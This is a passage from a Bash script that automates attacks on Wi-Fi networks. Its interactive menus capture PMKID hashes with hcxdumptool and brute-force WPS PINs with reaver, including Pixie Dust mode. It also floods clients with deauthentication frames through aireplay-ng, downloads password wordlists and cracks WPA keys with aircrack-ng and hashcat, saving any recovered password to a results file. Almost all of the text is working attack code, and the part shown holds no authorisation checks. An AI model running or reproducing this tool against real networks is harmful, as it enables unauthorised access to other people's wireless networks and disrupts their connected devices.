    echo "$TARGET_BSSID" | tr -d ':' | tr '[:upper:]' '[:lower:]' > "$filter_file"

    echo -e "${YELLOW}[*] Capturing PMKID (${timeout_secs}s timeout)...${NC}\n"

    # Run hcxdumptool in background so we can show progress
    hcxdumptool -i "$MONITOR_INTERFACE" \
        -o "${pmkid_file}.pcapng" \
        --filterlist_ap="$filter_file" \
        --filtermode=2 \
        > "$SESSION_DIR/logs/pmkid.log" 2>&1 &
    local hcx_pid=$!

    # Progress loop — also watch log for PMKID confirmation
    while [ $elapsed -lt $timeout_secs ]; do
        sleep 2
        elapsed=$((elapsed + 2))
        printf "\r${CYAN}  [*] Probing router... ${elapsed}s / ${timeout_secs}s${NC}   "

        # hcxdumptool logs "PMKID" when one is captured
        if grep -qi "PMKID" "$SESSION_DIR/logs/pmkid.log" 2>/dev/null; then
            echo -e "\n${GREEN}[+] PMKID frame detected in capture!${NC}"
            break
        fi

        # Also check if process died unexpectedly
        if ! kill -0 $hcx_pid 2>/dev/null; then
            echo -e "\n${YELLOW}[!] hcxdumptool exited early${NC}"
            break
        fi
    done

    kill $hcx_pid 2>/dev/null
    wait $hcx_pid 2>/dev/null
    echo ""

    # Validate capture file exists and has data
    if [ ! -f "${pmkid_file}.pcapng" ] || [ ! -s "${pmkid_file}.pcapng" ]; then
        echo -e "${RED}[!] No capture file produced${NC}"
        echo -e "${YELLOW}[*] Possible reasons:${NC}"
        echo -e "    • Router doesn't broadcast PMKID (some newer routers disabled it)"
        echo -e "    • Signal too weak (${TARGET_BSSID} at ${NETWORK_PWRS[*]}dBm)"
        echo -e "    • Interface not in monitor mode properly\n"
        _pmkid_fallback_menu
        return 1
    fi

    # Convert to hashcat 22000 format
    echo -e "${YELLOW}[*] Converting capture to hashcat format...${NC}"
    hcxpcapngtool -o "${pmkid_file}.22000" \
        -E "$SESSION_DIR/captures/pmkid_essids.txt" \
        "${pmkid_file}.pcapng" 2>/dev/null

    if [ ! -f "${pmkid_file}.22000" ] || [ ! -s "${pmkid_file}.22000" ]; then
        echo -e "${RED}[!] Conversion failed — PMKID not present in capture${NC}"
        echo -e "${YELLOW}    The router may not support PMKID or ignored our probes${NC}\n"
        _pmkid_fallback_menu
        return 1
    fi

    local hash_count
    hash_count=$(wc -l < "${pmkid_file}.22000")

    echo -e "${GREEN}[+] PMKID CAPTURED SUCCESSFULLY!${NC}"
    echo -e "    Hashes:  ${CYAN}${hash_count}${NC}"
    echo -e "    File:    ${CYAN}${pmkid_file}.22000${NC}\n"

    PMKID_CAPTURED=true
    log_action "PMKID captured: ${hash_count} hash(es) saved to ${pmkid_file}.22000"
    return 0
}

_pmkid_fallback_menu() {
    echo -e "${YELLOW}[?] What would you like to do?${NC}"
    echo -e "  ${GREEN}[1]${NC} Retry PMKID capture"
    echo -e "  ${GREEN}[2]${NC} Try handshake capture instead"
    echo -e "  ${GREEN}[3]${NC} Return to attack menu"
    read -p "Choice: " fallback
    case $fallback in
        1) attack_pmkid ;;
        2) attack_handshake_capture ;;
        *) show_attack_menu ;;
    esac
}
attack_wps() {
    echo -e "${BLUE}[*] Starting WPS PIN attack...${NC}\n"

    # Dependency check
    if ! command -v reaver &>/dev/null; then
        echo -e "${RED}[!] Reaver not installed${NC}"
        echo -e "${YELLOW}[*] Install with: sudo apt-get install reaver${NC}\n"
        echo -e "${YELLOW}[?] What would you like to do?${NC}"
        echo -e "  ${GREEN}[1]${NC} Try handshake capture instead"
        echo -e "  ${GREEN}[2]${NC} Return to attack menu"
        read -p "Choice: " fallback
        case $fallback in
            1) attack_handshake_capture ;;
            *) show_attack_menu ;;
        esac
        return 1
    fi

    # Step 1 — Check if WPS is enabled using wash
    echo -e "${YELLOW}[*] Scanning for WPS on target...${NC}"

    local wps_enabled=false
    local wps_locked=false
    local wps_version=""

    if command -v wash &>/dev/null; then
        local wash_out
        # Run wash for 15s focused on target channel
        wash_out=$(timeout 15 wash -i "$MONITOR_INTERFACE" \
            -c "$TARGET_CHANNEL" 2>/dev/null | grep -i "$TARGET_BSSID")

        if [ -n "$wash_out" ]; then
            wps_enabled=true
            echo -e "${GREEN}[+] WPS detected on target:${NC}"
            echo -e "    $wash_out\n"

            # wash output: BSSID  Ch  dBm  WPS  Lck  Vendor  ESSID
            # column 4 = WPS version, column 5 = locked (Yes/No)
            wps_version=$(echo "$wash_out" | awk '{print $4}')
            local locked_col=$(echo "$wash_out" | awk '{print $5}')

            if [[ "$locked_col" =~ [Yy]es ]]; then
                wps_locked=true
                echo -e "${RED}  ⚠ WPS is LOCKED on this router${NC}"
                echo -e "${RED}  ⚠ Attack will likely fail or take extremely long${NC}\n"
            else
                echo -e "${GREEN}  ✓ WPS is not locked — good candidate${NC}\n"
            fi
        else
            echo -e "${YELLOW}  [-] WPS not detected on $TARGET_BSSID${NC}"
            echo -e "${YELLOW}      Router may have WPS disabled or hidden\n${NC}"
        fi
    else
        echo -e "${YELLOW}  [!] wash not available — skipping WPS detection${NC}"
        echo -e "${YELLOW}      Install with: sudo apt-get install wash\n${NC}"
        wps_enabled=true  # assume and let user decide
    fi

    # Warn if locked or not detected
    if [ "$wps_locked" = true ]; then
        echo -e "${YELLOW}[?] WPS is locked. Continue anyway?${NC}"
        echo -e "    ${CYAN}This may trigger longer lockout periods${NC}"
        read -p "[y/N]: " locked_confirm
        [[ ! "$locked_confirm" =~ ^[Yy]$ ]] && { show_attack_menu; return 1; }
    elif [ "$wps_enabled" = false ]; then
        echo -e "${YELLOW}[?] WPS not detected. Try anyway?${NC}"
        read -p "[y/N]: " no_wps_confirm
        [[ ! "$no_wps_confirm" =~ ^[Yy]$ ]] && { show_attack_menu; return 1; }
    fi

    # Step 2 — Choose reaver mode
    echo -e "${YELLOW}[*] Select Reaver attack mode:${NC}"
    echo -e "  ${GREEN}[1]${NC} Normal         — standard PIN brute force"
    echo -e "  ${GREEN}[2]${NC} Aggressive     — faster, more likely to trigger lockout"
    echo -e "  ${GREEN}[3]${NC] Pixie Dust     — fast attack, works on vulnerable chipsets only"
    read -p "Select [1-3]: " reaver_mode

    echo -e "\n${YELLOW}[*] Starting Reaver — this can take minutes to hours${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop and return to menu${NC}\n"

    local reaver_args="-i $MONITOR_INTERFACE -b $TARGET_BSSID -c $TARGET_CHANNEL -L -N"

    case $reaver_mode in
        2) reaver_args="$reaver_args -vv -d 1 -T 0.5 -r 3:15 --no-nacks" ;;
        3) reaver_args="$reaver_args -vv -K 1" ;;           # pixie dust via reaver -K
        *) reaver_args="$reaver_args -vv -d 2 -T 0.5 --no-nacks" ;;
    esac

    # Temporarily override Ctrl+C to stop reaver cleanly
    trap '' SIGINT
    reaver $reaver_args 2>&1 | tee "$SESSION_DIR/logs/reaver.log" &
    REAVER_PID=$!
    trap "kill $REAVER_PID 2>/dev/null; _wps_stopped_menu; return" SIGINT

    # Monitor reaver output for key events
    local last_pin=""
    while kill -0 $REAVER_PID 2>/dev/null; do
        sleep 3

        # Detect WPS PIN found
        if grep -q "WPS PIN:" "$SESSION_DIR/logs/reaver.log" 2>/dev/null; then
            local pin
            pin=$(grep "WPS PIN:" "$SESSION_DIR/logs/reaver.log" | tail -1 | grep -oP '\d{8}')
            local psk
            psk=$(grep "WPA PSK:" "$SESSION_DIR/logs/reaver.log" | tail -1 | sed "s/.*WPA PSK: '//;s/'.*//")

            echo -e "\n${GREEN}╔════════════════════════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║              WPS PIN FOUND!                            ║${NC}"
            echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
            echo -e "  ${CYAN}WPS PIN: $pin${NC}"
            echo -e "  ${CYAN}WPA PSK: $psk${NC}\n"

            WPS_SUCCESS=true
            log_action "WPS PIN found: $pin | PSK: $psk"

            # Save result
            {
                echo "Network:  $TARGET_ESSID"
                echo "BSSID:    $TARGET_BSSID"
                echo "WPS PIN:  $pin"
                echo "Password: $psk"
                echo "Method:   WPS Reaver"
            } > "$SESSION_DIR/results/password.txt"

            kill $REAVER_PID 2>/dev/null
            break
        fi

        # Detect WPS lockout mid-attack
        if grep -q "WPS transaction failed\|WARNING: Detected AP rate limiting\|Waiting" \
            "$SESSION_DIR/logs/reaver.log" 2>/dev/null; then
            local lock_count
            lock_count=$(grep -c "rate limiting\|Waiting" \
                "$SESSION_DIR/logs/reaver.log" 2>/dev/null)
            if [ "$lock_count" -gt 5 ]; then
                echo -e "\n${RED}[!] AP appears to be rate limiting / locking WPS${NC}"
                echo -e "${YELLOW}[?] Continue waiting or abort?${NC}"
                echo -e "  ${GREEN}[1]${NC} Keep going"
                echo -e "  ${GREEN}[2]${NC} Stop and try different attack"
                read -p "Choice: " lock_choice
                [ "$lock_choice" = "2" ] && {
                    kill $REAVER_PID 2>/dev/null
                    _wps_stopped_menu
                    return 1
                }
            fi
        fi
    done

    wait $REAVER_PID 2>/dev/null
    trap cleanup SIGINT SIGTERM

    if [ "$WPS_SUCCESS" = false ]; then
        echo -e "${RED}[!] WPS attack did not find PIN${NC}\n"
        _wps_stopped_menu
    fi
}

_wps_stopped_menu() {
    trap cleanup SIGINT SIGTERM
    echo -e "\n${YELLOW}[?] What would you like to do?${NC}"
    echo -e "  ${GREEN}[1]${NC} Resume reaver (continues from saved session)"
    echo -e "  ${GREEN}[2]${NC} Try handshake capture instead"
    echo -e "  ${GREEN}[3]${NC} Try PMKID attack instead"
    echo -e "  ${GREEN}[4]${NC} Return to attack menu"
    read -p "Choice: " choice
    case $choice in
        1) attack_wps ;;
        2) attack_handshake_capture ;;
        3) attack_pmkid ;;
        *) show_attack_menu ;;
    esac
}

# Attack 4: Deauth Attack
attack_deauth() {
    echo -e "${BLUE}[*] Starting deauthentication attack...${NC}\n"
    echo -e "${CYAN}  Target AP:  $TARGET_ESSID ($TARGET_BSSID)${NC}"
    echo -e "${CYAN}  Channel:    $TARGET_CHANNEL${NC}\n"

    # Show known clients from scan if any
    local known_clients=()
    if command -v grep &>/dev/null && [ -f "$SESSION_DIR/captures/scan-01.csv" ]; then
        while IFS=',' read -r sta_mac first last power packets bssid probed; do
            bssid="${bssid// /}"
            sta_mac="${sta_mac// /}"
            [[ "$bssid" == "$TARGET_BSSID" ]] || continue
            [[ "$sta_mac" =~ ^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2} ]] || continue
            known_clients+=("$sta_mac")
        done < <(awk '/^Station MAC/,0' "$SESSION_DIR/captures/scan-01.csv")
    fi

    echo -e "${YELLOW}[*] Attack options:${NC}"
    echo -e "  ${GREEN}[1]${NC} Targeted — single client"
    echo -e "  ${GREEN}[2]${NC} Broadcast — all clients"
    echo -e "  ${GREEN}[3]${NC} Continuous broadcast (until Ctrl+C)"
    echo -e "  ${GREEN}[0]${NC} Back to attack menu"
    read -p "Select [0-3]: " deauth_type

    case $deauth_type in

        0) show_attack_menu; return ;;

        1)
            # Show known clients if available
            if [ ${#known_clients[@]} -gt 0 ]; then
                echo -e "\n${CYAN}[*] Known clients from scan:${NC}"
                for i in "${!known_clients[@]}"; do
                    echo -e "  ${GREEN}[$((i+1))]${NC} ${known_clients[$i]}"
                done
                echo -e "  ${GREEN}[m]${NC} Enter MAC manually\n"
                read -p "Select client: " client_choice

                if [[ "$client_choice" =~ ^[0-9]+$ ]] && \
                   [ "$client_choice" -ge 1 ] && \
                   [ "$client_choice" -le "${#known_clients[@]}" ]; then
                    client_mac="${known_clients[$((client_choice-1))]}"
                else
                    read -p "Enter client MAC: " client_mac
                fi
            else
                echo -e "${YELLOW}  No clients found in scan data${NC}"
                read -p "Enter client MAC manually: " client_mac
            fi

            # Validate MAC format
            if [[ ! "$client_mac" =~ ^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$ ]]; then
                echo -e "${RED}[!] Invalid MAC format${NC}"
                attack_deauth
                return
            fi

            read -p "How many deauth packets to send [default 20]: " pkt_count
            pkt_count=${pkt_count:-20}

            echo -e "\n${GREEN}[+] Deauthing $client_mac from $TARGET_ESSID...${NC}"
            aireplay-ng --deauth "$pkt_count" \
                -a "$TARGET_BSSID" \
                -c "$client_mac" \
                "$MONITOR_INTERFACE" 2>&1 | grep -E "Sending|sent|error"

            echo -e "${GREEN}[+] Sent $pkt_count deauth packets to $client_mac${NC}"
            log_action "Targeted deauth: $pkt_count packets to $client_mac on $TARGET_BSSID"
            ;;

        2)
            read -p "How many deauth packets to send [default 50]: " pkt_count
            pkt_count=${pkt_count:-50}

            echo -e "\n${GREEN}[+] Broadcasting $pkt_count deauth packets to all clients...${NC}"
            aireplay-ng --deauth "$pkt_count" \
                -a "$TARGET_BSSID" \
                "$MONITOR_INTERFACE" 2>&1 | grep -E "Sending|sent|error"

            echo -e "${GREEN}[+] Broadcast deauth complete${NC}"
            log_action "Broadcast deauth: $pkt_count packets to $TARGET_BSSID"
            ;;

        3)
            echo -e "\n${YELLOW}[*] Continuous deauth — press Ctrl+C to stop${NC}\n"

            # Override trap so Ctrl+C only stops aireplay, not whole script
            trap '' SIGINT
            aireplay-ng --deauth 0 \
                -a "$TARGET_BSSID" \
                "$MONITOR_INTERFACE" 2>&1 | grep -E "Sending|sent|error" &
            local deauth_pid=$!
            trap "kill $deauth_pid 2>/dev/null" SIGINT

            wait $deauth_pid 2>/dev/null
            trap cleanup SIGINT SIGTERM

            echo -e "\n${GREEN}[+] Continuous deauth stopped${NC}"
            log_action "Continuous deauth stopped: $TARGET_BSSID"
            ;;

        *)
            echo -e "${RED}[!] Invalid selection${NC}"
            attack_deauth
            return
            ;;
    esac

    # Post-attack menu
    echo ""
    echo -e "${YELLOW}[?] What next?${NC}"
    echo -e "  ${GREEN}[1]${NC} Run deauth again"
    echo -e "  ${GREEN}[2]${NC} Start handshake capture (clients will reconnect)"
    echo -e "  ${GREEN}[3]${NC} Return to attack menu"
    read -p "Choice: " next
    case $next in
        1) attack_deauth ;;
        2) attack_handshake_capture ;;
        *) show_attack_menu ;;
    esac
}

################################################################################
# PASSWORD CRACKING
################################################################################
setup_wordlists() {
    echo -e "${BLUE}[*] Setting up wordlists...${NC}\n"

    mkdir -p "$WORDLIST_DIR"
    WORDLISTS=()  # reset to avoid duplicates on re-run

    echo -e "${YELLOW}[*] Scanning for wordlists...${NC}\n"

    # Common locations — ordered by priority
    local search_paths=(
        "/usr/share/wordlists"
        "/usr/share/seclists/Passwords"
        "/usr/share/seclists/Passwords/WiFi-WPA"
        "$WORDLIST_DIR"
        "$HOME/wordlists"
    )

    # Track seen real paths to avoid duplicates
    declare -A seen_paths

    printf "${CYAN}%-4s %-35s %-10s %-12s %s${NC}\n" \
        "No." "Filename" "Size" "Passwords" "Path"
    printf "${CYAN}%-4s %-35s %-10s %-12s %s${NC}\n" \
        "---" "-----------------------------------" "--------" "------------" "----"

    local count=0

    for path in "${search_paths[@]}"; do
        [ -d "$path" ] || continue

        while IFS= read -r -d '' file; do
            # Resolve real path to catch symlinks/duplicates
            local real
            real=$(realpath "$file" 2>/dev/null || echo "$file")

            # Skip if already seen
            [ "${seen_paths[$real]+_}" ] && continue
            seen_paths["$real"]=1

            # Skip files under 1KB — too small to be useful
            local size_bytes
            size_bytes=$(stat -c%s "$file" 2>/dev/null || echo 0)
            [ "$size_bytes" -lt 1024 ] && continue

            # Skip files that look like logs/results not wordlists
            local fname
            fname=$(basename "$file")
            [[ "$fname" =~ \.(log|cap|csv|pcap|pcapng|json|xml|pot)$ ]] && continue

            # Format size
            local size_display
            if [ "$size_bytes" -ge $((1024*1024)) ]; then
                size_display="$(( size_bytes / 1024 / 1024 ))MB"
            else
                size_display="$(( size_bytes / 1024 ))KB"
            fi

            # Line count = password count (capped at 10M for speed)
            local line_count
            line_count=$(awk 'END{print NR}' "$file" 2>/dev/null || echo "?")
            local line_display
            if [ "$line_count" -ge 1000000 ] 2>/dev/null; then
                line_display="$(( line_count / 1000000 ))M"
            elif [ "$line_count" -ge 1000 ] 2>/dev/null; then
                line_display="$(( line_count / 1000 ))K"
            else
                line_display="$line_count"
            fi

            count=$((count + 1))
            WORDLISTS+=("$file")

            printf "${GREEN}%-4s${NC} %-35s %-10s %-12s ${CYAN}%s${NC}\n" \
                "$count" "$fname" "$size_display" "$line_display" \
                "${path/#$HOME/\~}"

        done < <(find "$path" -maxdepth 2 -type f \
            \( -name "*.txt" -o -name "*.lst" -o -name "*.dict" \) \
            -print0 2>/dev/null)
    done

    echo ""

    if [ $count -eq 0 ]; then
        echo -e "${YELLOW}[!] No wordlists found in standard locations${NC}\n"
        offer_download_wordlists
        return
    fi

    echo -e "${GREEN}[+] Found $count wordlist(s)${NC}\n"

    # Also offer to add a custom path
    echo -e "${YELLOW}[?] Add a custom wordlist path? [y/N]:${NC} \c"
    read -r custom_choice
    if [[ "$custom_choice" =~ ^[Yy]$ ]]; then
        read -p "Path to wordlist: " custom_path
        if [ -f "$custom_path" ]; then
            local real
            real=$(realpath "$custom_path" 2>/dev/null || echo "$custom_path")
            if [ ! "${seen_paths[$real]+_}" ]; then
                WORDLISTS+=("$custom_path")
                echo -e "${GREEN}[+] Added: $custom_path${NC}"
            else
                echo -e "${YELLOW}[!] Already in list${NC}"
            fi
        else
            echo -e "${RED}[!] File not found: $custom_path${NC}"
        fi
    fi

    # Offer download if rockyou not present
    if ! printf '%s\n' "${WORDLISTS[@]}" | grep -qi "rockyou"; then
        echo -e "\n${YELLOW}[!] rockyou.txt not found — most common WiFi wordlist${NC}"
        echo -e "${YELLOW}[?] Download it? [y/N]:${NC} \c"
        read -r dl_choice
        [[ "$dl_choice" =~ ^[Yy]$ ]] && offer_download_wordlists
    fi
}

offer_download_wordlists() {
    echo -e "${BLUE}[*] Wordlist Download Manager${NC}\n"

    # Define available wordlists
    local -A WL_NAMES=(
        [1]="rockyou.txt"
        [2]="top-10k.txt"
        [3]="top-1M.txt"
        [4]="wifi-common.txt"
    )
    local -A WL_URLS=(
        [1]="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.gz"
        [2]="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt"
        [3]="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
        [4]="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt"
    )
    local -A WL_SIZES=(
        [1]="134MB  — best overall coverage"
        [2]="40KB   — fast test, low coverage"
        [3]="8MB    — good balance"
        [4]="50KB   — WiFi-specific passwords"
    )
    local -A WL_COMPRESSED=(
        [1]="yes"
        [2]="no"
        [3]="no"
        [4]="no"
    )

    echo -e "${YELLOW}Select wordlists to download (comma separated, e.g. 1,3):${NC}\n"
    echo -e "  ${GREEN}[1]${NC} rockyou.txt        ${CYAN}${WL_SIZES[1]}${NC}"
    echo -e "  ${GREEN}[2]${NC} top-10k.txt        ${CYAN}${WL_SIZES[2]}${NC}"
    echo -e "  ${GREEN}[3]${NC} top-1M.txt         ${CYAN}${WL_SIZES[3]}${NC}"
    echo -e "  ${GREEN}[4]${NC} wifi-common.txt    ${CYAN}${WL_SIZES[4]}${NC}"
    echo -e "  ${GREEN}[a]${NC} All of the above"
    echo -e "  ${GREEN}[s]${NC} Skip\n"
    read -p "Select: " dl_input

    # Handle skip
    [[ "$dl_input" =~ ^[Ss]$ ]] && return

    # Build list of selections
    local selections=()
    if [[ "$dl_input" =~ ^[Aa]$ ]]; then
        selections=(1 2 3 4)
    else
        IFS=',' read -ra selections <<< "$dl_input"
    fi

    echo ""

    for choice in "${selections[@]}"; do
        choice="${choice// /}"  # trim spaces
        [ -z "${WL_NAMES[$choice]}" ] && {
            echo -e "${RED}[!] Invalid option: $choice — skipping${NC}"
            continue
        }

        local filename="${WL_NAMES[$choice]}"
        local url="${WL_URLS[$choice]}"
        local dest="$WORDLIST_DIR/$filename"
        local compressed="${WL_COMPRESSED[$choice]}"

        # Skip if already exists and non-empty
        if [ -f "$dest" ] && [ -s "$dest" ]; then
            local existing_lines
            existing_lines=$(wc -l < "$dest")
            echo -e "${YELLOW}[!] $filename already exists ($existing_lines passwords) — skipping${NC}"
            # Make sure it's in WORDLISTS
            printf '%s\n' "${WORDLISTS[@]}" | grep -qF "$dest" || WORDLISTS+=("$dest")
            continue
        fi

        echo -e "${BLUE}[*] Downloading $filename...${NC}"

        local tmp_dest="$dest"
        [ "$compressed" = "yes" ] && tmp_dest="${dest}.gz"

        # Download with progress bar
        if command -v curl &>/dev/null; then
            curl -L --progress-bar -o "$tmp_dest" "$url"
            local dl_status=$?
        else
            wget --progress=bar:force -O "$tmp_dest" "$url" 2>&1
            local dl_status=$?
        fi

        # Check download succeeded
        if [ $dl_status -ne 0 ] || [ ! -s "$tmp_dest" ]; then
            echo -e "${RED}[!] Download failed for $filename${NC}"
            rm -f "$tmp_dest" 2>/dev/null
            continue
        fi

        # Decompress if needed
        if [ "$compressed" = "yes" ]; then
            echo -e "${YELLOW}[*] Decompressing...${NC}"
            if gunzip -f "$tmp_dest"; then
                echo -e "${GREEN}[+] Decompressed successfully${NC}"
            else
                echo -e "${RED}[!] Decompression failed — file may be corrupt${NC}"
                rm -f "$tmp_dest" 2>/dev/null
                continue
            fi
        fi

        # Verify final file
        if [ ! -f "$dest" ] || [ ! -s "$dest" ]; then
            echo -e "${RED}[!] Final file missing or empty: $dest${NC}"
            continue
        fi

        local line_count
        line_count=$(wc -l < "$dest")
        local size_display
        size_display=$(du -sh "$dest" | cut -f1)

        echo -e "${GREEN}[+] $filename ready${NC}"
        echo -e "    Passwords: ${CYAN}$(printf "%'d" $line_count)${NC}"
        echo -e "    Size:      ${CYAN}$size_display${NC}"
        echo -e "    Path:      ${CYAN}$dest${NC}\n"

        WORDLISTS+=("$dest")
        log_action "Downloaded wordlist: $filename ($line_count passwords)"
    done

    if [ ${#WORDLISTS[@]} -eq 0 ]; then
        echo -e "${RED}[!] No wordlists available — cracking will not be possible${NC}"
    else
        echo -e "${GREEN}[+] Total wordlists ready: ${#WORDLISTS[@]}${NC}\n"
    fi
}

crack_with_wordlists() {
    echo -e "${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║           PASSWORD CRACKING SESSION                    ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}\n"

    # Check wordlists
    if [ ${#WORDLISTS[@]} -eq 0 ]; then
        echo -e "${RED}[!] No wordlists available${NC}"
        echo -e "${YELLOW}[?] Run wordlist setup now? [Y/n]:${NC} \c"
        read -r wl_setup
        [[ ! "$wl_setup" =~ ^[Nn]$ ]] && setup_wordlists
        [ ${#WORDLISTS[@]} -eq 0 ] && return 1
    fi

    # Determine hash file and type
    local hash_file=""
    local hash_type="22000"  # modern hashcat type for both PMKID and handshake
    local crack_source=""

    if [ "$PMKID_CAPTURED" = true ]; then
        hash_file="$SESSION_DIR/captures/pmkid.22000"
        crack_source="PMKID"
    elif [ "$HANDSHAKE_CAPTURED" = true ]; then
        # Find the actual cap file — could be -01, -02 etc.
        hash_file=$(ls -t "$SESSION_DIR/captures/handshake"-*.cap 2>/dev/null | head -1)
        crack_source="WPA Handshake"

        # Convert handshake to 22000 format for hashcat
        local converted="$SESSION_DIR/captures/handshake.22000"
        if [ ! -f "$converted" ] || [ ! -s "$converted" ]; then
            echo -e "${YELLOW}[*] Converting handshake to hashcat format...${NC}"
            if command -v hcxpcapngtool &>/dev/null; then
                hcxpcapngtool -o "$converted" "$hash_file" 2>/dev/null
            elif command -v hcxpcaptool &>/dev/null; then
                hcxpcaptool -z "$converted" "$hash_file" 2>/dev/null
            fi
            if [ -f "$converted" ] && [ -s "$converted" ]; then
                echo -e "${GREEN}[+] Converted to 22000 format${NC}"
            else
                echo -e "${YELLOW}[!] Conversion failed — hashcat will use cap file directly${NC}"
                converted="$hash_file"
                hash_type="2500"  # fallback to legacy only if conversion fails
            fi
        else
            echo -e "${GREEN}[+] Using existing converted hash${NC}"
        fi
    else
        echo -e "${RED}[!] Nothing to crack — no handshake or PMKID captured yet${NC}"
        return 1
    fi

    # Validate hash file exists
    if [ -z "$hash_file" ] || [ ! -f "$hash_file" ]; then
        echo -e "${RED}[!] Hash file not found: ${hash_file:-unknown}${NC}"
        return 1
    fi

    echo -e "${GREEN}[+] Crack source: $crack_source${NC}"
    echo -e "${GREEN}[+] Hash file:    $hash_file${NC}"
    echo -e "${GREEN}[+] Wordlists:    ${#WORDLISTS[@]} available${NC}\n"

    # Method selection
    echo -e "${BLUE}[*] Select cracking method:${NC}"
    echo -e "  ${GREEN}[1]${NC} Aircrack-ng     — CPU, works directly on .cap"
    echo -e "  ${GREEN}[2]${NC} Hashcat          — GPU accelerated, much faster"
    echo -e "  ${GREEN}[3]${NC} Both             — try aircrack first, hashcat if not found"
    echo -e "  ${GREEN}[4]${NC} Compare wordlists — benchmark all wordlists against target"
    echo -e "  ${GREEN}[0]${NC} Back\n"
    read -p "Select [0-4]: " crack_method

    case $crack_method in
        0)
            return 0
            ;;
        1)
            crack_with_aircrack "$hash_file"
            ;;
        2)
            local hc_file="${converted:-$hash_file}"
            crack_with_hashcat "$hc_file" "$hash_type"
            ;;
        3)
            # Try aircrack first — stop if found
            if crack_with_aircrack "$hash_file"; then
                echo -e "${GREEN}[+] Password found with aircrack — skipping hashcat${NC}"
            else
                echo -e "${YELLOW}[*] Aircrack failed — trying hashcat...${NC}\n"
                local hc_file="${converted:-$hash_file}"
                crack_with_hashcat "$hc_file" "$hash_type"
            fi
            ;;
        4)
            compare_wordlists "$hash_file" "$hash_type"
            ;;
        *)
            echo -e "${RED}[!] Invalid selection${NC}"
            crack_with_wordlists
            ;;
    esac
}

crack_with_aircrack() {
    local capture_file="$1"

    echo -e "\n${BLUE}[*] Cracking with aircrack-ng...${NC}\n"

    # Wordlist selection
    echo -e "${YELLOW}[*] Available wordlists:${NC}\n"
    for i in "${!WORDLISTS[@]}"; do
        local wl_lines
        wl_lines=$(wc -l < "${WORDLISTS[$i]}" 2>/dev/null)
        local wl_size
        wl_size=$(du -sh "${WORDLISTS[$i]}" 2>/dev/null | cut -f1)
        printf "  ${GREEN}[%s]${NC} %-30s ${CYAN}%s passwords  %s${NC}\n" \
            "$((i+1))" "$(basename "${WORDLISTS[$i]}")" \
            "$(printf "%'d" "$wl_lines")" "$wl_size"
    done

    echo -e "\n  ${GREEN}[a]${NC} All wordlists"
    echo -e "  ${GREEN}[0]${NC} Back\n"
    read -p "Select (comma separated e.g. 1,3): " wl_input

    [ "$wl_input" = "0" ] && return 0

    local wordlists_to_try=()
    if [[ "$wl_input" =~ ^[Aa]$ ]]; then
        wordlists_to_try=("${WORDLISTS[@]}")
    else
        IFS=',' read -ra choices <<< "$wl_input"
        for choice in "${choices[@]}"; do
            choice="${choice// /}"
            if [[ "$choice" =~ ^[0-9]+$ ]] && \
               [ "$choice" -ge 1 ] && \
               [ "$choice" -le "${#WORDLISTS[@]}" ]; then
                wordlists_to_try+=("${WORDLISTS[$((choice-1))]}")
            else
                echo -e "${RED}[!] Invalid selection: $choice — skipping${NC}"
            fi
        done
    fi

    [ ${#wordlists_to_try[@]} -eq 0 ] && {
        echo -e "${RED}[!] No valid wordlists selected${NC}"
        crack_with_aircrack "$capture_file"
        return
    }

    local total=${#wordlists_to_try[@]}
    local current=0

    for wordlist in "${wordlists_to_try[@]}"; do
        current=$((current + 1))
        local wl_name
        wl_name=$(basename "$wordlist")
        local wl_lines
        wl_lines=$(wc -l < "$wordlist" 2>/dev/null || echo "?")
        local log_file="$SESSION_DIR/results/aircrack_${current}.log"

        echo -e "\n${CYAN}[*] Wordlist $current/$total: $wl_name${NC}"
        echo -e "${CYAN}    Passwords: $(printf "%'d" "$wl_lines")${NC}\n"

        local start
        start=$(date +%s)

        # Run aircrack — show live output, also save to log
        aircrack-ng "$capture_file" \
            -w "$wordlist" \
            -b "$TARGET_BSSID" \
            2>/dev/null | tee "$log_file"

        local end
        end=$(date +%s)
        local elapsed=$((end - start))

        # Check result
        if grep -q "KEY FOUND" "$log_file"; then
            local password
            password=$(grep "KEY FOUND" "$log_file" | \
                sed 's/.*\[ \(.*\) \]/\1/' | tr -d '[:space:]')

            echo -e "\n${GREEN}╔════════════════════════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║                 PASSWORD FOUND!                        ║${NC}"
            echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
            echo -e "  ${CYAN}Network:  ${NC}$TARGET_ESSID"
            echo -e "  ${CYAN}BSSID:    ${NC}$TARGET_BSSID"
            echo -e "  ${CYAN}Password: ${GREEN}$password${NC}"
            echo -e "  ${CYAN}Wordlist: ${NC}$wl_name"
            echo -e "  ${CYAN}Time:     ${NC}${elapsed}s"
            echo -e "  ${CYAN}Speed:    ${NC}~$(( wl_lines / (elapsed + 1) )) p/s\n"

            log_action "PASSWORD FOUND: $password (aircrack, $wl_name, ${elapsed}s)"

            # Save result file
            {
                echo "Network:  $TARGET_ESSID"
                echo "BSSID:    $TARGET_BSSID"
                echo "Password: $password"
                echo "Method:   aircrack-ng"
                echo "Wordlist: $wl_name"
                echo "Time:     ${elapsed}s"
                echo "Date:     $(date)"
            } > "$SESSION_DIR/results/password.txt"

            PASSWORDS_TESTED=$((PASSWORDS_TESTED + wl_lines))
            return 0
        fi

        # Not found — update stats and continue
        local speed=$(( wl_lines / (elapsed + 1) ))
        echo -e "${YELLOW}  [-] Not found in $wl_name${NC}"
        echo -e "${YELLOW}      Time: ${elapsed}s | Speed: ~$(printf "%'d" $speed) p/s${NC}"
        PASSWORDS_TESTED=$((PASSWORDS_TESTED + wl_lines))
    done

    echo -e "\n${RED}[!] Password not found in any selected wordlist${NC}"
